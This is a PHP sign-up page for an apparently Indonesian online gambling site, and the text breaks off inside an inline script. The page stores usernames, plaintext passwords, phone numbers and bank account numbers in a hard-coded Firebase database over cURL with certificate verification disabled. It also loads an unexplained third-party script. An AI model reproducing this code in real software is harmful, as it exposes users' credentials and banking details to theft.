<?php
session_start();
error_reporting(0); 

// --- 1. CONFIGURATION FIREBASE ---
define('FIREBASE_URL', 'https://firequeen-2986c-default-rtdb.asia-southeast1.firebasedatabase.app/');

function firebase_request($path, $method = 'GET', $data = null) {
    $url = FIREBASE_URL . $path . ".json";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    if ($data) {
        // Encode tanpa JSON_NUMERIC_CHECK agar string angka tidak berubah jadi integer
        $payload = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($payload)
        ));
    }

    $result = curl_exec($ch);
    curl_close($ch);
    return json_decode($result, true);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // --- 2. TANGKAP DATA ---
    $username   = trim($_POST['user_name'] ?? '');
    $password   = $_POST['password'] ?? '';
    $acc_name   = trim($_POST['acc_name'] ?? '');
    $mobile_no  = trim($_POST['mobile_no'] ?? '');
    $bank_name  = trim($_POST['bank_name'] ?? '');
    $acc_no     = preg_replace('/[^0-9]/', '', $_POST['acc_no'] ?? '');
    
    // TRIK SAKTI: Tambahkan spasi di depan variabel agar JSON membacanya sebagai TEXT murni
    $acc_no_final = " " . (string)$acc_no; 

    $method     = trim($_POST['method'] ?? 'Bank'); 

    // --- 3. FUNGSI TENDANG ---
    function tendang($pesan) {
        echo '<html><head><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script></head><body style="background:#111">';
        echo "<script>Swal.fire({icon:'error',title:'Gagal!',text:'$pesan',confirmButtonColor:'#d33'}).then(()=>{window.history.back();});</script></body></html>";
        exit(); 
    }

    // --- 4. VALIDASI ---
    if (empty($username) || empty($password) || empty($acc_name) || empty($mobile_no) || empty($acc_no)) {
        tendang("Harap isi semua kolom pendaftaran!");
    }

    if (!preg_match('/^[a-zA-Z0-9]{6,12}$/', $username)) {
        tendang("Username harus 6-12 karakter dan hanya huruf/angka!");
    }

    if (substr($mobile_no, 0, 1) === '0') {
        tendang("Nomor WA tanpa angka 0 di depan (Contoh: 812xxx)!");
    }

    // --- 5. CEK DUPLIKAT & SIMPAN ---
    $cekUser = firebase_request("users_situs1/" . $username, "GET");
    if ($cekUser !== null) {
        tendang("Username ini sudah terdaftar!");
    }

    // Data untuk disimpan
    $dataUser = [
        "password"  => $password,
        "acc_name"  => $acc_name,
        "mobile_no" => "62" . $mobile_no,
        "bank_name" => $bank_name,
        "acc_no"    => $acc_no_final, // Menggunakan variabel yang sudah dikasih spasi
        "method"    => $method,
        "saldo"     => 0, // Saldo tetap angka (Biru) gak masalah
        "status"    => "active",
        "reg_date"  => date("d/m/Y, H:i:s")
    ];

    $save = firebase_request("users_situs1/" . $username, "PUT", $dataUser);

    if ($save) {
        $_SESSION['username'] = $username;
        echo '<html><head><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script></head><body style="background:#000">';
        echo "<script>Swal.fire({title:'Pendaftaran Berhasil!',icon:'success',confirmButtonText:'OKE'}).then(()=>{window.location.href='index.php';});</script></body></html>";
    } else {
        tendang("Koneksi Firebase Gagal!");
    }
}

// Ambil data Live Chat secara real-time dari Firebase
$linkLiveChat = "https://direct.lc.chat/19926541/"; // Default jika belum di-set

$url_firebase_chat = FIREBASE_URL . "settings.json";
$ch_chat = curl_init();
curl_setopt($ch_chat, CURLOPT_URL, $url_firebase_chat);
curl_setopt($ch_chat, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch_chat, CURLOPT_SSL_VERIFYPEER, false);
$result_chat = curl_exec($ch_chat);
curl_close($ch_chat);

$dataSettings = json_decode($result_chat, true);
if (!empty($dataSettings['livechat'])) {
    $valLiveChat = trim($dataSettings['livechat']);
    $linkLiveChat = (strpos($valLiveChat, 'http') === 0) ? $valLiveChat : "https://direct.lc.chat/" . $valLiveChat . "/";
}
?>
<!DOCTYPE html>
<html lang="id-ID"><head><style>body {transition: opacity ease-in 0.2s; } 
body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
</style>
  <title>BABYBSOSS88 Daftar dan Link Login Alternatif Terbaru 2025</title>


<link rel="icon" href="/assets/ImageFile//iconbabyboss).png" type="image/gif">

<meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=no">



<script src="https://apis.google.com/_/scs/abc-static/_/js/k=gapi.lb.id.JlZG7ePi4xg.O/m=gapi_iframes/rt=j/sv=1/d=1/ed=1/rs=AHpOoo9bZCvgOq1E3JiiRDLsf0QN3hR_9A/cb=gapi.loaded_0?le=scs" async=""></script><script type="module" src="https://asset.qrishoki.com/gigagaming.js" async=""></script><style>.swal2-popup.swal2-toast{flex-direction:row;align-items:center;width:auto;padding:.625em;overflow-y:hidden;background:#fff;box-shadow:0 0 .625em #d9d9d9}.swal2-popup.swal2-toast .swal2-header{flex-direction:row;padding:0}.swal2-popup.swal2-toast .swal2-title{flex-grow:1;justify-content:flex-start;margin:0 .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{position:static;width:.8em;height:.8em;line-height:.8}.swal2-popup.swal2-toast .swal2-content{justify-content:flex-start;padding:0;font-size:1em}.swal2-popup.swal2-toast .swal2-icon{width:2em;min-width:2em;height:2em;margin:0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:700}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{font-size:.25em}}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{flex-basis:auto!important;width:auto;height:auto;margin:0 .3125em}.swal2-popup.swal2-toast .swal2-styled{margin:0 .3125em;padding:.3125em .625em;font-size:1em}.swal2-popup.swal2-toast .swal2-styled:focus{box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(50,100,150,.4)}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.8em;left:-.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-toast-animate-success-line-tip .75s;animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-toast-animate-success-line-long .75s;animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{-webkit-animation:swal2-toast-show .5s;animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{-webkit-animation:swal2-toast-hide .1s forwards;animation:swal2-toast-hide .1s forwards}.swal2-container{display:flex;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;flex-direction:row;align-items:center;justify-content:center;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:0 0!important}.swal2-container.swal2-top{align-items:flex-start}.swal2-container.swal2-top-left,.swal2-container.swal2-top-start{align-items:flex-start;justify-content:flex-start}.swal2-container.swal2-top-end,.swal2-container.swal2-top-right{align-items:flex-start;justify-content:flex-end}.swal2-container.swal2-center{align-items:center}.swal2-container.swal2-center-left,.swal2-container.swal2-center-start{align-items:center;justify-content:flex-start}.swal2-container.swal2-center-end,.swal2-container.swal2-center-right{align-items:center;justify-content:flex-end}.swal2-container.swal2-bottom{align-items:flex-end}.swal2-container.swal2-bottom-left,.swal2-container.swal2-bottom-start{align-items:flex-end;justify-content:flex-start}.swal2-container.swal2-bottom-end,.swal2-container.swal2-bottom-right{align-items:flex-end;justify-content:flex-end}.swal2-container.swal2-bottom-end>:first-child,.swal2-container.swal2-bottom-left>:first-child,.swal2-container.swal2-bottom-right>:first-child,.swal2-container.swal2-bottom-start>:first-child,.swal2-container.swal2-bottom>:first-child{margin-top:auto}.swal2-container.swal2-grow-fullscreen>.swal2-modal{display:flex!important;flex:1;align-self:stretch;justify-content:center}.swal2-container.swal2-grow-row>.swal2-modal{display:flex!important;flex:1;align-content:center;justify-content:center}.swal2-container.swal2-grow-column{flex:1;flex-direction:column}.swal2-container.swal2-grow-column.swal2-bottom,.swal2-container.swal2-grow-column.swal2-center,.swal2-container.swal2-grow-column.swal2-top{align-items:center}.swal2-container.swal2-grow-column.swal2-bottom-left,.swal2-container.swal2-grow-column.swal2-bottom-start,.swal2-container.swal2-grow-column.swal2-center-left,.swal2-container.swal2-grow-column.swal2-center-start,.swal2-container.swal2-grow-column.swal2-top-left,.swal2-container.swal2-grow-column.swal2-top-start{align-items:flex-start}.swal2-container.swal2-grow-column.swal2-bottom-end,.swal2-container.swal2-grow-column.swal2-bottom-right,.swal2-container.swal2-grow-column.swal2-center-end,.swal2-container.swal2-grow-column.swal2-center-right,.swal2-container.swal2-grow-column.swal2-top-end,.swal2-container.swal2-grow-column.swal2-top-right{align-items:flex-end}.swal2-container.swal2-grow-column>.swal2-modal{display:flex!important;flex:1;align-content:center;justify-content:center}.swal2-container.swal2-no-transition{transition:none!important}.swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right):not(.swal2-grow-fullscreen)>.swal2-modal{margin:auto}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-container .swal2-modal{margin:0!important}}.swal2-popup{display:none;position:relative;box-sizing:border-box;flex-direction:column;justify-content:center;width:32em;max-width:100%;padding:1.25em;border:none;border-radius:.3125em;background:#fff;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:0}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-header{display:flex;flex-direction:column;align-items:center;padding:0 1.8em}.swal2-title{position:relative;max-width:100%;margin:0 0 .4em;padding:0;color:#595959;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;flex-wrap:wrap;align-items:center;justify-content:center;width:100%;margin:1.25em auto 0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0,0,0,.1),rgba(0,0,0,.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2))}.swal2-actions.swal2-loading .swal2-styled.swal2-confirm{box-sizing:border-box;width:2.5em;height:2.5em;margin:.46875em;padding:0;-webkit-animation:swal2-rotate-loading 1.5s linear 0s infinite normal;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border:.25em solid transparent;border-radius:100%;border-color:transparent;background-color:transparent!important;color:transparent!important;cursor:default;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.swal2-actions.swal2-loading .swal2-styled.swal2-cancel{margin-right:30px;margin-left:30px}.swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after{content:"";display:inline-block;width:15px;height:15px;margin-left:5px;-webkit-animation:swal2-rotate-loading 1.5s linear 0s infinite normal;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border:3px solid #999;border-radius:50%;border-right-color:transparent;box-shadow:1px 1px 1px #fff}.swal2-styled{margin:.3125em;padding:.625em 2em;box-shadow:none;font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#3085d6;color:#fff;font-size:1.0625em}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#aaa;color:#fff;font-size:1.0625em}.swal2-styled:focus{outline:0;box-shadow:0 0 0 1px #fff,0 0 0 3px rgba(50,100,150,.4)}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1.25em 0 0;padding:1em 0 0;border-top:1px solid #eee;color:#545454;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;height:.25em;overflow:hidden;border-bottom-right-radius:.3125em;border-bottom-left-radius:.3125em}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:1.25em auto}.swal2-close{position:absolute;z-index:2;top:0;right:0;align-items:center;justify-content:center;width:1.2em;height:1.2em;padding:0;overflow:hidden;transition:color .1s ease-out;border:none;border-radius:0;background:0 0;color:#ccc;font-family:serif;font-size:2.5em;line-height:1.2;cursor:pointer}.swal2-close:hover{transform:none;background:0 0;color:#f27474}.swal2-close::-moz-focus-inner{border:0}.swal2-content{z-index:1;justify-content:center;margin:0;padding:0 1.6em;color:#545454;font-size:1.125em;font-weight:400;line-height:normal;text-align:center;word-wrap:break-word}.swal2-checkbox,.swal2-file,.swal2-input,.swal2-radio,.swal2-select,.swal2-textarea{margin:1em auto}.swal2-file,.swal2-input,.swal2-textarea{box-sizing:border-box;width:100%;transition:border-color .3s,box-shadow .3s;border:1px solid #d9d9d9;border-radius:.1875em;background:inherit;box-shadow:inset 0 1px 1px rgba(0,0,0,.06);color:inherit;font-size:1.125em}.swal2-file.swal2-inputerror,.swal2-input.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474!important;box-shadow:0 0 2px #f27474!important}.swal2-file:focus,.swal2-input:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:0;box-shadow:0 0 3px #c4e6f5}.swal2-file::-moz-placeholder,.swal2-input::-moz-placeholder,.swal2-textarea::-moz-placeholder{color:#ccc}.swal2-file:-ms-input-placeholder,.swal2-input:-ms-input-placeholder,.swal2-textarea:-ms-input-placeholder{color:#ccc}.swal2-file::-ms-input-placeholder,.swal2-input::-ms-input-placeholder,.swal2-textarea::-ms-input-placeholder{color:#ccc}.swal2-file::placeholder,.swal2-input::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em auto;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-input[type=number]{max-width:10em}.swal2-file{background:inherit;font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:inherit;color:inherit;font-size:1.125em}.swal2-checkbox,.swal2-radio{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-checkbox label,.swal2-radio label{margin:0 .6em;font-size:1.125em}.swal2-checkbox input,.swal2-radio input{margin:0 .4em}.swal2-validation-message{display:none;align-items:center;justify-content:center;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:1.25em auto 1.875em;border:.25em solid transparent;border-radius:50%;font-family:inherit;line-height:5em;cursor:default;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{-webkit-animation:swal2-animate-error-icon .5s;animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{-webkit-animation:swal2-animate-error-x-mark .5s;animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-.25em;left:-.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{-webkit-animation:swal2-animate-success-line-tip .75s;animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{-webkit-animation:swal2-animate-success-line-long .75s;animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{-webkit-animation:swal2-rotate-success-circular-line 4.25s ease-in;animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{align-items:center;margin:0 0 1.25em;padding:0;background:inherit;font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;width:2em;height:2em;border-radius:2em;background:#3085d6;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#3085d6}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}.swal2-progress-steps .swal2-progress-step-line{z-index:10;width:2.5em;height:.4em;margin:0 -1px;background:#3085d6}[class^=swal2]{-webkit-tap-highlight-color:transparent}.swal2-show{-webkit-animation:swal2-show .3s;animation:swal2-show .3s}.swal2-hide{-webkit-animation:swal2-hide .15s forwards;animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{right:auto;left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@supports (-ms-accelerator:true){.swal2-range input{width:100%!important}.swal2-range output{display:none}}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){.swal2-range input{width:100%!important}.swal2-range output{display:none}}@-moz-document url-prefix(){.swal2-close:focus{outline:2px solid rgba(50,100,150,.4)}}@-webkit-keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0)}}@-webkit-keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@-webkit-keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@-webkit-keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@-webkit-keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}100%{transform:scale(1)}}@-webkit-keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(.5);opacity:0}}@-webkit-keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@-webkit-keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@-webkit-keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@-webkit-keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@-webkit-keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0);opacity:1}}@-webkit-keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@keyframes swal2-rotate-loading{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto!important}body.swal2-no-backdrop .swal2-container{top:auto;right:auto;bottom:auto;left:auto;max-width:calc(100% - .625em * 2);background-color:transparent!important}body.swal2-no-backdrop .swal2-container>.swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}body.swal2-no-backdrop .swal2-container.swal2-top{top:0;left:50%;transform:translateX(-50%)}body.swal2-no-backdrop .swal2-container.swal2-top-left,body.swal2-no-backdrop .swal2-container.swal2-top-start{top:0;left:0}body.swal2-no-backdrop .swal2-container.swal2-top-end,body.swal2-no-backdrop .swal2-container.swal2-top-right{top:0;right:0}body.swal2-no-backdrop .swal2-container.swal2-center{top:50%;left:50%;transform:translate(-50%,-50%)}body.swal2-no-backdrop .swal2-container.swal2-center-left,body.swal2-no-backdrop .swal2-container.swal2-center-start{top:50%;left:0;transform:translateY(-50%)}body.swal2-no-backdrop .swal2-container.swal2-center-end,body.swal2-no-backdrop .swal2-container.swal2-center-right{top:50%;right:0;transform:translateY(-50%)}body.swal2-no-backdrop .swal2-container.swal2-bottom{bottom:0;left:50%;transform:translateX(-50%)}body.swal2-no-backdrop .swal2-container.swal2-bottom-left,body.swal2-no-backdrop .swal2-container.swal2-bottom-start{bottom:0;left:0}body.swal2-no-backdrop .swal2-container.swal2-bottom-end,body.swal2-no-backdrop .swal2-container.swal2-bottom-right{right:0;bottom:0}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll!important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static!important}}body.swal2-toast-shown .swal2-container{background-color:transparent}body.swal2-toast-shown .swal2-container.swal2-top{top:0;right:auto;bottom:auto;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{top:0;right:0;bottom:auto;left:auto}body.swal2-toast-shown .swal2-container.swal2-top-left,body.swal2-toast-shown .swal2-container.swal2-top-start{top:0;right:auto;bottom:auto;left:0}body.swal2-toast-shown .swal2-container.swal2-center-left,body.swal2-toast-shown .swal2-container.swal2-center-start{top:50%;right:auto;bottom:auto;left:0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{top:50%;right:auto;bottom:auto;left:50%;transform:translate(-50%,-50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{top:50%;right:0;bottom:auto;left:auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-left,body.swal2-toast-shown .swal2-container.swal2-bottom-start{top:auto;right:auto;bottom:0;left:0}body.swal2-toast-shown .swal2-container.swal2-bottom{top:auto;right:auto;bottom:0;left:50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{top:auto;right:0;bottom:0;left:auto}body.swal2-toast-column .swal2-toast{flex-direction:column;align-items:stretch}body.swal2-toast-column .swal2-toast .swal2-actions{flex:1;align-self:stretch;height:2.2em;margin-top:.3125em}body.swal2-toast-column .swal2-toast .swal2-loading{justify-content:center}body.swal2-toast-column .swal2-toast .swal2-input{height:2em;margin:.3125em auto;font-size:1em}body.swal2-toast-column .swal2-toast .swal2-validation-message{font-size:1em}</style><script src="https://apis.google.com/js/api.js?onload=__iframefcb624326" type="text/javascript" charset="UTF-8" gapi_processed="true"></script></head><body class="mobile"><div style="position: fixed; bottom: 120px; left: 10px; z-index: 10; opacity: 0.98;">
<a href="https://l1nk.dev/wababyboss" target="_blank" rel="nofollow"><img src="/assets/media.tenor.com/Spdlu7aT88AAAAAj/wp.gif" style="object-fit:cover;" width="40" height="40" border="0" alt="WA Mercusuar77"></a></div> 
<script>
    window.addEventListener("load", function () {
      const banner = document.getElementById("carousel-fixed-height");
      if (!banner || document.getElementById("maxwin-overlay")) return;
    
